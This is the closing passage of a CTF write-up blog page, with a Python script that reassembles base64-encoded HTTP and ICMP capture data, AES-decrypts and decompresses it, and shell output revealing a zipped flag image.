+</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>message</span><span class=p>[:</span><span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>message</span> <span class=o>=</span> <span class=n>message</span><span class=p>[</span><span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>    <span class=n>aes</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>(),</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>message</span> <span class=o>=</span> <span class=n>aes</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>unpad</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>s</span><span class=p>:</span> <span class=n>s</span><span class=p>[:</span><span class=o>-</span><span class=nb>ord</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>:])]</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>unpad</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>tmp</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data_http.b64&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>data_http</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>data_http</span> <span class=o>=</span> <span class=nb>filter</span><span class=p>(</span><span class=nb>bool</span><span class=p>,</span> <span class=n>data_http</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>clear_http</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>data_http</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>clear_http</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b64decode</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Dictionnary creation from http data</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>clear_http</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>  <span class=n>tmp</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>clear_http</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)[</span><span class=mi>2</span><span class=p>])]</span> <span class=o>=</span> <span class=n>clear_http</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)[</span><span class=mi>4</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data_icmp.b64&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>data_icmp</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>g</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>clear_icmp</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>data_icmp</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>clear_icmp</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b64decode</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>clear_icmp</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>clear_icmp</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Dictionnary append with icmp data</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>clear_icmp</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>  <span class=n>tmp</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>clear_icmp</span><span class=p>[</span><span class=n>j</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)[</span><span class=mi>2</span><span class=p>])]</span> <span class=o>=</span> <span class=n>clear_icmp</span><span class=p>[</span><span class=n>j</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)[</span><span class=mi>4</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>final</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>tmp</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>  <span class=n>final</span> <span class=o>+=</span> <span class=n>tmp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>final</span> <span class=o>=</span> <span class=n>final</span><span class=p>[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>aes_decrypt</span><span class=p>(</span><span class=n>final</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>),</span><span class=s2>&#34;IMTLD</span><span class=si>{This_is_just_a_key_not_the_flag}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>decompress</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> <span class=c1># zlib decompression</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.dat&#39;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>h</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>h</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;[+] flag.dat written :)&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./decrypt.py 
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> flag.dat written :<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ file flag.dat 
+</span></span><span class=line><span class=cl>flag.dat: Zip archive data, at least v2.0 to extract
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ unzip -l flag.dat                                                
+</span></span><span class=line><span class=cl>Archive:  flag.dat
+</span></span><span class=line><span class=cl>  Length      Date    Time    Name
+</span></span><span class=line><span class=cl>---------  ---------- -----   ----
+</span></span><span class=line><span class=cl>    <span class=m>25369</span>  2018-11-09 22:34   flag.jpg
+</span></span><span class=line><span class=cl>---------                     -------
+</span></span><span class=line><span class=cl>    <span class=m>25369</span>                     <span class=m>1</span> file
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ unzip flag.dat
+</span></span><span class=line><span class=cl>Archive:  flag.dat
+</span></span><span class=line><span class=cl><span class=o>[</span>flag.dat<span class=o>]</span> flag.jpg password: IMTLD<span class=o>{</span>N0t_Th3_Fl4g<span class=o>}</span>
+</span></span><span class=line><span class=cl>  inflating: flag.jpg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ file flag.jpg 
+</span></span><span class=line><span class=cl>flag.jpg: JPEG image data, JFIF standard 1.01, resolution <span class=o>(</span>DPI<span class=o>)</span>, density 72x72, segment length 16, baseline, precision 8, 706x396, components <span class=m>1</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-1>Flag</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg data-srcset="/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg, /lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg 1.5x, /lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg title=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg></p></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
